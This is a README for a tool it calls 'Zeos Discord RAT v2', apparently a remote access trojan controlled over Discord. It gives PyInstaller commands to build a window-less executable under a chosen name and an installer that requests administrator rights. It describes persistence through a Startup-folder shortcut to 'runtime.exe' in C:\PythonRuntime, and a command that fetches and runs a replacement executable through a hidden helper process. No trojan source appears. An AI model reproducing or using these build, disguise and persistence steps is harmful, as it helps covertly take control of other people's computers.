# Zeos Discord RAT v2

## Useful Commands

### Install deps

```python
uv sync
```

### Install pyinstaller as dev dep

```python
uv add --dev pyinstaller
```

### Generate exe file

```python
uv run pyinstaller --clean --onefile --noconsole --paths src --name "<your-app-name>" main.py
```

### Generate installer

```python
uv run pyinstaller --clean --onefile --console --uac-admin --collect-data certifi --paths src --name "installer" installer.py
```

### Run uninstaller.ps1 to uninstall the rat

```pwsh
Set-ExecutionPolicy -Scope Process Bypass
.\uninstaller.ps1
```

### Installation location

The runtime is installed in `C:\PythonRuntime` (`runtime.exe`) and is started
through a startup shortcut in the user's Startup folder. The uninstaller
removes that folder again.

### Updating the runtime

`z!update_app` downloads the newest `runtime.exe` from the GitHub releases,
replaces the running one and starts it again. The update runs through a
hidden helper process, because Windows does not allow replacing a running
executable.
